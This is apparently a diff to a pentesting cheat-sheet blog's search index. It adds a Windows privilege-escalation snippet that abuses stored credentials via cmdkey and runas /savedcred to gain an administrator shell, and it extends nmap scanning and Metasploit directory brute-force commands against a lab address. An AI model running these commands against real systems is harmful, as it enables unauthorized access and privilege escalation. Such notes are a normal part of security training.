@@ -1,6 +1,21 @@
 [
   
   {
+    "title": "windows command &amp; paste",
+    "url": "/posts/winprivesc/",
+    "categories": "command&paste",
+    "tags": "privilege, escalation",
+    "date": "2022-04-18 11:00:00 +0200",
+    
+
+
+
+
+
+    "snippet": "From Powershell:PS C:\\Users\\john&amp;gt; cmdkey /list;Check the stored credential (eg. administrator) and run:PS C:\\Users\\john&amp;gt; runas.exe /savedcred /user:administrator cmd; run command prompt as administrator.enjoy the escalation from john to admnistrator ;)C:\\Windows\\system32&amp;gt; whoami;"
+  },
+  
+  {
     "title": "sqlcmd command &amp; paste",
     "url": "/posts/sqlcmd/",
     "categories": "command&paste",
@@ -42,7 +57,7 @@
 
 
 
-    "snippet": "Recon: nmap host discovery:nmap -Pn -n -T5 -sV -sC -p 135,137,139,445,3389 10.10.10.50 # map a windows servernmap -Pn 10.10.10.50 # -Pn force nmap to scan ports even if the host seems to be down.nmap -Pn -p443 10.10.10.50 # -p force nmap to scan ports even if filtered is in place.nmap -Pn -sV -p80 10.10.10.50 # -sV force nmap to discovery the service versioning grabbing the banner.nmap 10.10.10.0/20 --open # -open force nmap to only show open (or possibly open) portsnmap -sV -script banner 10.10.10.50 # banner versioningnmap -PE -sn 10.10.10.50 --reason --packet-trace --disable-arp-ping # ICMP type 8 (echo request)-PP #ICMP type 13 TIMESTAMP-PM #ICMP type 17 ADDRESS MASK REQUEST-PS #TCP SYN sweep-PA #TCP ACK sweep-PU #UDP sweepnmap -sS -p22 10.10.10.50 --reason --packet-trace --disable-arp-ping #Check out the nmap GUI version of the Nmap tool with ability to store scan data into the database, plot the network diagram based on the scan result such as services, hostname, etc.."
+    "snippet": "Recon: nmap host discovery:nmap -Pn -n -T5 -sV -sC -p 135,137,139,445,3389 10.10.10.50 # map a windows servernmap -Pn 10.10.10.50 # -Pn force nmap to scan ports even if the host seems to be down.nmap -Pn -p443 10.10.10.50 # -p force nmap to scan ports even if filtered is in place.nmap -Pn -sV -p80 10.10.10.50 # -sV force nmap to discovery the service versioning grabbing the banner.nmap 10.10.10.0/20 --open # -open force nmap to only show open (or possibly open) portsnmap -sV -script banner 10.10.10.50 # banner versioningnmap -PE -sn 10.10.10.50 --reason --packet-trace --disable-arp-ping # ICMP type 8 (echo request) and packet trace enabled-PP #ICMP type 13 TIMESTAMP-PM #ICMP type 17 ADDRESS MASK REQUEST-PS #TCP SYN sweep-PA #TCP ACK sweep-PU #UDP sweepnmap -sS -p22 10.10.10.50 --reason --packet-trace --disable-arp-ping # scan on port 22 w/ packet trace enabledCheck out the nmap GUI version of the Nmap tool with ability to store scan data into the database, plot the network diagram based on the scan result such as services, hostname, etc.."
   },
   
   {
@@ -222,7 +237,7 @@
 
 
 
-    "snippet": "#msfconsole -qmsf&amp;gt; use auxiliary/scanner/http/http_versionmsf&amp;gt; set RHOSTS 10.10.10.50msf&amp;gt; exploit"
+    "snippet": "#msfconsole -qmsf&amp;gt; use auxiliary/scanner/http/http_versionmsf&amp;gt; set RHOSTS 10.10.10.50msf&amp;gt; exploit#msfconsole -qmsf&amp;gt; use auxiliary/scanner/http/brute_dirsmsf&amp;gt; set RHOSTS 10.10.10.50msf&amp;gt; exploit"
   },
   
   {
